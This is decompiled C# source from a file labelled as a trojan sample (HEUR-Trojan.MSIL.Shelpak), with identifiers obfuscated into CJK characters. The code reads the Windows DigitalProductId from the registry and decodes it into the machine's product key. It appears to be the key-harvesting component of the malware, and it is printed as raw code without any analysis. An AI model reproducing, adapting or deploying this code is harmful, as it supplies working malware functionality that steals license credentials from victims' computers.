// Decompiled with JetBrains decompiler
// Type: 見匚阜子攴方土石舛夂革心又.隹舌屮卩耳韋臼干龠玄支心韋走臣
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using Microsoft.Win32;
using System;
using System.Collections;
using 火長宀舛火尸彐方自儿丿广;

namespace 見匚阜子攴方土石舛夂革心又
{
  public class 隹舌屮卩耳韋臼干龠玄支心韋走臣
  {
    public static string 韭石亠幺聿邑辛斗己貝彳廴(byte[] 而鹿襾龍工小宀毛虫赤鼓片革)
    {
      string str1 = string.Empty;
      byte num1 = (byte) ((int) 而鹿襾龍工小宀毛虫赤鼓片革[66] / 6 & 1);
      而鹿襾龍工小宀毛虫赤鼓片革[66] = (byte) ((int) 而鹿襾龍工小宀毛虫赤鼓片革[66] & 247 | ((int) num1 & 2) * 4);
      int length = 0;
      for (int index1 = 24; index1 >= 0; --index1)
      {
        int index2 = 0;
        for (int index3 = 14; index3 >= 0; --index3)
        {
          int num2 = index2 * 256;
          int num3 = (int) 而鹿襾龍工小宀毛虫赤鼓片革[index3 + 52] + num2;
          而鹿襾龍工小宀毛虫赤鼓片革[index3 + 52] = (byte) (num3 / 24);
          index2 = num3 % 24;
          length = index2;
        }
        str1 = "BCDFGHJKMPQRTVWXY2346789"[index2].ToString() + str1;
      }
      string str2 = str1.Substring(1, length) + "N" + str1.Substring(length + 1, str1.Length - (length + 1));
      for (int startIndex = 5; startIndex < str2.Length; startIndex += 6)
        str2 = str2.Insert(startIndex, "-");
      return str2;
    }

    private static string 弋皮屮龠耒卜斗金夕見(byte[] 竹戈辵黍干斤土匸比羽夊頁儿牛匕二革)
    {
      char[] chArray1 = new char[24]
      {
        'B',
        'C',
        'D',
        'F',
        'G',
        'H',
        'J',
        'K',
        'M',
        'P',
        'Q',
        'R',
        'T',
        'V',
        'W',
        'X',
        'Y',
        '2',
        '3',
        '4',
        '6',
        '7',
        '8',
        '9'
      };
      char[] chArray2 = new char[29];
      ArrayList arrayList = new ArrayList();
      for (int index = 52; index <= 67; ++index)
        arrayList.Add((object) 竹戈辵黍干斤土匸比羽夊頁儿牛匕二革[index]);
      for (int index1 = 28; index1 >= 0; --index1)
      {
        if ((index1 + 1) % 6 == 0)
        {
          chArray2[index1] = '-';
        }
        else
        {
          int index2 = 0;
          for (int index3 = 14; index3 >= 0; --index3)
          {
            int num = index2 << 8 | (int) (byte) arrayList[index3];
            arrayList[index3] = (object) (byte) (num / 24);
            index2 = num % 24;
            chArray2[index1] = chArray1[index2];
          }
        }
      }
      return new string(chArray2);
    }

    private static string 豆竹生爿魚小廾冂厂丿无水木阜車父足(
      byte[] 疋山十入气鬥夕飛夊己匸无文厂臼凵方,
      隹舌屮卩耳韋臼干龠玄支心韋走臣.几尢里宀片方工矢厂口食土 入士木羊米士色冂彐土癶隹)
    {
      return 入士木羊米士色冂彐土癶隹 != 隹舌屮卩耳韋臼干龠玄支心韋走臣.几尢里宀片方工矢厂口食土.走鬼血非龜爪辰牛麻米屮 ? 隹舌屮卩耳韋臼干龠玄支心韋走臣.弋皮屮龠耒卜斗金夕見(疋山十入气鬥夕飛夊己匸无文厂臼凵方) : 隹舌屮卩耳韋臼干龠玄支心韋走臣.韭石亠幺聿邑辛斗己貝彳廴(疋山十入气鬥夕飛夊己匸无文厂臼凵方);
    }

    public static string 羽禾玄鬲子瓜干欠片屮大攴夕()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
      object obj = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")?.GetValue("DigitalProductId");
      if (obj == null)
        return "Failed to get DigitalProductId from registry";
      byte[] 疋山十入气鬥夕飛夊己匸无文厂臼凵方 = (byte[]) obj;
      registryKey.Close();
      bool flag = Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2 || Environment.OSVersion.Version.Major > 6;
      丿士止土巾幺山田巾弋宀小.禸耳父几聿日示風冫氏至竹風 = true;
      int 入士木羊米士色冂彐土癶隹 = flag ? 1 : 0;
      return 隹舌屮卩耳韋臼干龠玄支心韋走臣.豆竹生爿魚小廾冂厂丿无水木阜車父足(疋山十入气鬥夕飛夊己匸无文厂臼凵方, (隹舌屮卩耳韋臼干龠玄支心韋走臣.几尢里宀片方工矢厂口食土) 入士木羊米士色冂彐土癶隹);
    }

    public enum 几尢里宀片方工矢厂口食土
    {
      矢干干皿甘氏女十匚瓦乙辛飛,
      走鬼血非龜爪辰牛麻米屮,
    }
  }
}
